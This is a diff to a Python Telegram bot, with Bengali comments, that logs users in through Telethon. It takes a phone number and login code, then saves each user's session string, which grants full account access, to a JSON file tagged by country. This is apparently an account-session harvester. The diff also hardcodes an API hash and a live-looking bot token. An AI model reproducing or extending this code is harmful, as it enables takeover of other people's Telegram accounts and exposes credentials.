@@ -4,17 +4,16 @@ from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-# আপনার my.telegram.org থেকে প্রাপ্ত API_ID এবং API_HASH এখানে দিন
-API_ID = 3416690
+# সঠিক API_ID এবং API_HASH
+API_ID = 34166690
 API_HASH = 'f80db9e0f7d2c57ffec3db21b359d339'
 
-# বোট টোকেন (আপনার বোটের টোকেন এখানে বসাবেন)
+# আপনার টেলিগ্রাম বট টোকেন
 BOT_TOKEN = '8873131995:AAHBW19oc4_6TjsPBJhusFJCB1g2VJyKFNQ'
 
 # সেভ করা ডেটা রাখার ফাইল
 DATA_FILE = 'saved_accounts.json'
 
-# লোকাল মেমোরি বা ফাইল হ্যান্ডলিং
 def load_data():
     if os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'r') as f:
@@ -25,7 +24,6 @@ def save_data(data):
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=4)
 
-# ক্লায়েন্ট হ্যান্ডেল করার জন্য টেম্পোরারি স্টোরেজ
 temp_storage = {}
 
 bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -93,7 +91,6 @@ async def handle_user_input(event):
         phone = text
         temp_storage[sender_id]['phone'] = phone
         
-        # ক্লায়েন্ট ইনিশিয়ালাইজ করে ওটিপি পাঠানো
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         
@@ -142,10 +139,8 @@ async def handle_user_input(event):
 async def finalize_login(event, sender_id, client, phone):
     session_string = client.session.save()
     
-    # কান্ট্রি ডিটেক্ট করার ছোট্ট লজিক (ফোন নম্বর অনুযায়ী)
     country = "Bangladesh" if phone.startswith("+880") else "International"
     
-    # ডেটা সেভ করা
     data = load_data()
     str_sender_id = str(sender_id)
     if str_sender_id not in data:
